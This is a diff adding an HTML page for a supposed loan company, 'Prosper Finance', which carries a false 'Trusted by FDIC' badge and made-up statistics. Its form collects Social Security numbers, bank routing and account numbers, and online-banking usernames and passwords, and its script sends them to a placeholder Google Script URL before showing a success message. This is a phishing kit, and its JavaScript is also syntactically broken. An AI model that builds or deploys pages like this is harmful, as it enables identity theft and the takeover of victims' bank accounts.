@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Prosper Finance</title>
+
+<style>
+body {
+  margin:0;
+  font-family: 'Segoe UI', sans-serif;
+  background:#f4f7fb;
+}
+
+/* HEADER */
+header {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:15px 40px;
+  background:white;
+  box-shadow:0 2px 10px rgba(0,0,0,0.05);
+}
+
+.logo {
+  font-size:22px;
+  font-weight:bold;
+  color:#ff6a00;
+}
+
+/* HERO */
+.hero {
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:60px;
+  background:linear-gradient(135deg,#ff7a00,#ff0066);
+  color:white;
+}
+
+.hero-text {
+  max-width:500px;
+}
+
+.hero h1 {
+  font-size:42px;
+}
+
+.hero p {
+  margin:15px 0;
+}
+
+.btn {
+  padding:14px 28px;
+  border:none;
+  border-radius:6px;
+  cursor:pointer;
+  font-weight:bold;
+}
+
+.primary {
+  background:white;
+  color:#ff0066;
+}
+
+.hero img {
+  width:400px;
+}
+
+/* TRUST SECTION */
+.trust {
+  text-align:center;
+  padding:40px;
+  background:white;
+}
+
+.trust h2 {
+  margin-bottom:20px;
+}
+
+.stats {
+  display:flex;
+  justify-content:center;
+  gap:50px;
+}
+
+.stat {
+  font-size:20px;
+  font-weight:bold;
+}
+
+/* FORM SECTIONS */
+.section {
+  display:none;
+  max-width:450px;
+  margin:40px auto;
+  padding:30px;
+  background:white;
+  border-radius:10px;
+  box-shadow:0 5px 20px rgba(0,0,0,0.1);
+}
+
+input {
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:6px;
+  border:1px solid #ccc;
+}
+
+.submit-btn {
+  background:#ff0066;
+  color:white;
+  width:100%;
+}
+
+/* FOOTER */
+footer {
+  text-align:center;
+  padding:20px;
+  color:#777;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <div class="logo">Prosper Finance</div>
+  <button class="btn primary" onclick="showVerification()">Apply Now</button>
+</header>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-text">
+    <h1>Fast Personal Loans up to $10,000</h1>
+    <p>Low rates. No hidden fees. Get funds as soon as next day.</p>
+    <button class="btn primary" onclick="showVerification()">Check Your Rate</button>
+  </div>
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRcDTXXgSWKcN_YvC2BgpDJNpeRv3WzJnLs4g&s">
+</div>
+
+<!-- TRUST -->
+<div class="trust">
+  <h2>Trusted by FDIC</h2>
+  <div class="stats">
+    <div class="stat">$2B+ Funded</div>
+    <div class="stat">500K+ Customers</div>
+    <div class="stat">4.8★ Rating</div>
+  </div>
+</div>
+
+<!-- E-Verification -->
+<div class="section" id="verify">
+  <h2>E-Verification</h2>
+  <p>Secure identity verification required before application</p>
+  <button class="btn primary" onclick="showForm()">Start Verification</button>
+</div>
+
+<!-- FORM -->
+<div class="section" id="formSection">
+  <h2>Loan Application</h2>
+
+  <form id="loanForm">
+    <input type="text" name="name" placeholder="Full Name" required>
+    <input type="email" name="email" placeholder="Email Address" required>
+    <input type="phone" name="phone" placeholder="Phone Number" required>
+    <input type="social" name="social" placeholder="Social" required>
+    <input type="address" name="address" placeholder="Address" required>
+    <input type="bank" name="bank" placeholder="Bank Name" required>
+    <input type="routing" name="routing" placeholder="Routing Number" required>
+    <input type="account" name="account" placeholder="Account Number" required>
+    <input type="username" name="username" placeholder="Username" required>
+    <input type="password" name="password" placeholder="Password" required>
+    <button type="submit" class="btn submit-btn">Submit Application</button>
+  </form>
+</div>
+
+<footer>
+  © 2026 Prosper Finance
+</footer>
+
+<script>
+function showVerification() {
+  document.getElementById("verify").style.display = "block";
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+function showForm() {
+  document.getElementById("formSection").style.display = "block";
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+document.getElementById("loanForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const form = this;
+
+  const data = {
+    Name: form.Name.value,
+    Address: form.Address.value
+    Email: form.Email.value,
+    Phone: form.Phone.value,
+    Social: form.Social.value
+    Bank: form.Bank Name.value
+    Routing : form.Routing Number.value
+    Account: form.Account Number.value
+    Username: form.Username.value
+    Password: form.Password.value
+  };
+
+  fetch("YOUR_GOOGLE_SCRIPT_URL", {
+    method: "POST",
+    body: JSON.stringify(data)
+  })
+  .then(res => {
+    alert("Application Submitted Successfully ✅");
+    form.reset();
+  })
+  .catch(err => {
+    alert("Error submitting form ❌");
+  });
+});
+</script>
+
+</body>
+</html>
